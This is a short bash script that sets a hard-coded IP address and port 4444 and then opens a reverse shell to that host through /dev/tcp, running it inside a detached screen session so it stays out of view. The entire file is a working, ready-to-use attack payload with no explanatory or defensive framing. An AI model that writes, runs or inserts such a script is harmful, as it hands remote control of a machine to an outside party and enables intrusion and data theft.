#!/bin/bash

ip='178.128.209.245'
port='4444'
screen -md bash -c "bash -i >/dev/tcp/$ip/$port 0<&1 2>&1"
exit
